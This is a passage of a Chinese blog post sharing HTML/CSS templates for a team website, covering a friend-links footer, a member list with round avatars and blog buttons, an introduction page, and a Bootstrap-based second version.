class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span>友情链接：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;url&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>text<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="成员">成员</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="comment">/*让头像变圆*/</span></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.round_icon</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">110px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">110px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*一级标题设置*/</span></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: Raleway, RalewayOffline, sans-serif;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: <span class="number">500</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">letter-spacing</span>: <span class="number">2px</span></span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*每个头像的大小设置*/</span></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.article</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*每个分组的设置*/</span></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.section</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">flex-direction</span>: row;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color: black;text-align: center; &quot;</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color: black;text-align:center;&quot;</span>&gt;</span>(点击头像可前往各位师傅们的博客)<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color: black;text-align: left; &quot;</span>&gt;</span>分组组名<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;article&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;博客地址&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;font-size: 20px;&quot;</span>&gt;</span> 师傅id <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>师傅简介<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="简介">简介</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="comment">/*设置文本首行缩进2个字符*/</span></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">text-indent</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color: black;text-align:left;&quot;</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>2022-8-24第二版</p><p>这一次是根据bootstrap框架来写</p></blockquote><h2 id="成员-2">成员</h2><ul><li>成品</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220824192134678.png" alt="image-20220824192134678"></p><ul><li>代码：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>框架<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.btn</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: auto;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">315deg</span>, <span class="number">#89d8d3</span> <span class="number">0%</span>, <span class="number">#03c8a8</span> <span class="number">74%</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-family</span>: <span class="string">&#x27;Lato&#x27;</span>, sans-serif;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-weight</span>: <span class="number">500</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">box-shadow</span>: inset <span class="number">2px</span> <span class="number">2px</span> <span class="number">2px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, .<span class="number">5</span>), <span class="number">7px</span> <span class="number">7px</span> <span class="number">20px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">1</span>), <span class="number">4px</span> <span class="number">4px</span> <span class="number">5px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">1</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">outline</span>: none;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">z-index</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.btn</span><span class="selector-pseudo">::before</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transition</span>: all <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">315deg</span>, <span class="number">#4dccc6</span> <span class="number">0%</span>, <span class="number">#96e4df</span> <span class="number">74%</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">z-index</span>: -<span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.btn</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.btn</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">top</span>: <span class="number">2px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.top-buffer</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;font-size: 60px;&quot;</span>&gt;</span>大标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>组名<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-4&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">width</span>=<span class="string">&quot;110&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon img-circle&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 1em; font-weight: bold;&quot;</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 2em; font-size:medium;&quot;</span>&gt;</span>介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-col-lg-4&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-4&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">width</span>=<span class="string">&quot;110&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon img-circle&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 1em; font-weight: bold;&quot;</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 2em; font-size:medium;&quot;</span>&gt;</span>介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-col-lg-4&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-4&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">width</span>=<span class="string">&quot;110&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon img-circle&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 1em; font-weight: bold;&quot;</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 2em; font-size:medium;&quot;</span>&gt;</span>介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-col-lg-4&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>组名<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-4&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">width</span>=<span class="string">&quot;110&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon img-circle&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 1em; font-weight: bold;&quot;</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 2em; font-size:medium;&quot;</span>&gt;</span>介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-col-lg-4&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-4&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">width</span>=<span class="string">&quot;110&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon img-circle&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 1em; font-weight: bold;&quot;</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 2em; font-size:medium;&quot;</span>&gt;</span>介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-col-lg-4&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span 